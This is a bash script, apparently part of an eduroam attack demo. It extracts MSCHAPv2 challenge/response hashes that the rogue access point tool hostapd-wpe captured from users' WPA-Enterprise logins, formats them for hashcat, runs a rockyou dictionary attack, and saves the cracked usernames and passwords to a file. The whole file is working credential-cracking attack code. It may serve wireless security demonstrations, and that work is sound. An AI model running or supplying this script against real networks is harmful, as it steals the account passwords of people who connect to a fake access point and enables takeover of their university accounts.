#!/bin/bash

# === File paths ===
LOG_FILE="/opt/demo_attack_eduroam/hostapd-wpe/hostapd-wpe.log"      # Log file generated by hostapd-wpe
HASH_FILE="/opt/demo_attack_eduroam/hostapd-wpe/hashes.txt"          # Temporary file to store extracted hashes for Hashcat
WORDLIST="/usr/share/wordlists/rockyou.txt"                          # Wordlist used by Hashcat for password cracking
OUTPUT_FILE="/opt/demo_attack_eduroam/hostapd-wpe/cracked.txt"       # Final output file where recovered credentials will be saved

# === Check that the log file exists ===
if [ ! -f "$LOG_FILE" ]; then
    echo "Error: file $LOG_FILE not found."
    exit 1
fi

# === Decompress the rockyou.txt wordlist if necessary ===
if [ ! -f "$WORDLIST" ]; then
    if [ -f "$WORDLIST.gz" ]; then
        echo "[*] Decompressing rockyou.txt.gz..."
        gunzip "$WORDLIST.gz"
    else
        echo "Error: wordlist rockyou.txt not found in /usr/share/wordlists/"
        exit 1
    fi
fi

echo "[*] Extracting MSCHAPv2 hashes from $LOG_FILE..."
> "$HASH_FILE"  # Create or clear the hash file

# === Extract and format MSCHAPv2 hashes for Hashcat ===
# Expected format for Hashcat mode 5500 is: username::::response:challenge
awk '
BEGIN { username=""; challenge=""; response="" }
/^mschapv2:/ { username=""; challenge=""; response="" }
/username:/ { username=$2 }
/challenge:/ {
    gsub(":", "", $2)  # Remove colons from hex
    challenge=$2
}
/response:/ {
    gsub(":", "", $2)
    response=$2
}
/hashcat NETNTLM:/ {
    if (username != "" && challenge != "" && response != "") {
        # Print in the correct format for Hashcat (-m 5500)
        printf "%s::::%s:%s\n", username, response, challenge
    }
}
' "$LOG_FILE" >> "$HASH_FILE"

# === Check if any hashes were extracted ===
if [ ! -s "$HASH_FILE" ]; then
    echo "Error: no MSCHAPv2 hashes found in log."
    exit 1
fi

echo "[*] MSCHAPv2 hashes saved to $HASH_FILE."
echo "[*] Starting Hashcat..."

# === Run Hashcat ===
# -m 5500 : MSCHAPv2 hash mode
# -a 0    : Dictionary attack
# -O      : Optimized kernels (faster but limited support for long passwords)
# -w 3    : Workload profile (3 = high)
hashcat -m 5500 -a 0 -O -w 3 "$HASH_FILE" "$WORDLIST"

echo "[*] Saving found credentials..."

# === Ensure the output file exists to avoid errors with grep ===
touch "$OUTPUT_FILE"

# === Parse Hashcat output and save unique credentials ===
# Output format of hashcat --show for mode 5500:
# username::::response:challenge:password
hashcat -m 5500 --show "$HASH_FILE" | while IFS=':' read -r username _ _ _ rest; do
    # Extract the password (last field)
    password=$(echo "$rest" | awk -F':' '{print $NF}')

    # Compose a formatted line
    credential_line="username:$username --> password:$password;"

    # Avoid duplicate entries by checking the entire line
    # grep options:
    # -q: quiet
    # -F: fixed string
    # -x: exact match
    if ! grep -qFx "$credential_line" "$OUTPUT_FILE"; then
        echo "$credential_line" >> "$OUTPUT_FILE"
    fi
done

# === Clean up temporary files ===
rm -f "$HASH_FILE"

echo "[*] Credentials saved to $OUTPUT_FILE."
echo "[*] Operation completed successfully!"
